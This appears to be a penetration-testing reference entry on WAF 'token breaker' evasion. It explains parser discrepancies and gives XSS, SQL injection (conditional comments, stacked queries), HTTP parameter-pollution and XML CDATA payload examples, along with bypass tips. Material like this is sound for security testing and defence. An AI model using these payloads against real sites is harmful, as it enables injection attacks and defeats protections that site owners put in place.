---
id: WAF-EVASION-11
title: Token Breakers
category: Evasion Techniques
severity_range: Medium-High
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-11: Token Breakers

## Summary

Token breakers are special characters, unusual syntax, or malformed tokens that WAF parsers fail to interpret correctly, causing the WAF to either skip tokenization, misinterpret the payload structure, or enter a different parsing mode. The backend parser, however, recovers from or skips over these tokens and executes the intended attack.

## When to Use

- Against WAFs with limited or buggy parser implementations
- When the WAF and backend application use different parsers for the same protocol/language
- Against WAFs that fail fast on unknown tokens instead of continuing to parse
- When the target uses a lenient parser that ignores or skips malformed constructs

## Technique Details

Token breakers exploit parser differences by introducing symbols or syntax that:

- Cause the WAF parser to error out, skip the payload, or misinterpret boundaries.
- Shift the parsing context (e.g., from SQL to string literal) in ways not anticipated.
- Exploit parser inconsistencies between the WAF and the backend application.

**Unknown tokens** that the WAF's lexer does not recognize can cause it to skip tokenization, leaving embedded payloads unexamined.

**Unusual brackets** and operators may be interpreted differently by the WAF and the target parser (e.g., `[[]]`, `{}`, `//`).

**Context-breaking characters** change the parsing mode (e.g., from URL to JavaScript or from SQL to string).

## Payload Examples

```javascript
// Unknown tokens to confuse WAF parsers
(![]+[])[+[]]  // JSFuck-style token confusion

// Unusual bracket combinations
window[[]].alert(1)
alert.call(null,1)
(function(){return alert})().call(this,1)

// Backtick templates (ES6 template literals)
alert`1`
alert.call`1`

// Context-breaking characters
%3C%25%3Dalert(1)%25%3E  // ASP-style delimiters <%
```

```sql
-- Token breakers in SQL
SELECT * FROM users WHERE id=1 /*!30000union*/ select 1,2,3
-- MySQL conditional comment: executed only on MySQL >= 3.0.0

SELECT * FROM users WHERE id=1 union--comment
select 1,2,3
-- Newline after comment works in MySQL (--<newline>

SELECT * FROM users WHERE id=1 ;SELECT 1,2,3
-- Semicolon as statement separator (if stacked queries supported)
```

```http
// HTTP token breaking
// WAF decodes parameter, but HTTP/2 vs HTTP/1.1 parsing differs
GET /search?q=1%20union%20select%201,2,3 HTTP/2
Host: target.com

// Parameter pollution as token breaker
GET /search?q=1&q=union&q=select&q=1,2,3 HTTP/1.1
Host: target.com
```

```xml
<!-- XML token breaking -->
<root><child>]]>&lt;script&gt;alert(1)&lt;/script&gt;</child></root>
<!-- CDATA section breaks tokenization -->
```

## Detection & Bypass Notes

**Detection:**
- WAFs with robust parser implementations (tolerant of unknown tokens) are less affected.
- AST-based WAFs that reconstruct the semantic structure rather than token sequence are resistant.
- WAFs that fall back to regex matching when parsing fails can still catch payloads.

**Bypass:**
- Test each parser boundary in the WAF (URL → body → SQL → database, or URL → body → HTML → JavaScript).
- Use server-specific parser bugs (e.g., IIS %u encoding, Apache chunked encoding quirks).
- Combine token breakers with encoding: double-encode the token-breaking characters.
- Study the specific parser library used by the WAF and find known parsing discrepancies.

## References

- https://github.com/0xInfection/Awesome-WAF
- https://www.slideshare.net/neilmatatall/waf-evasion-techniques
- https://portswigger.net/research/bypassing-wafs-with-alternative-parsers
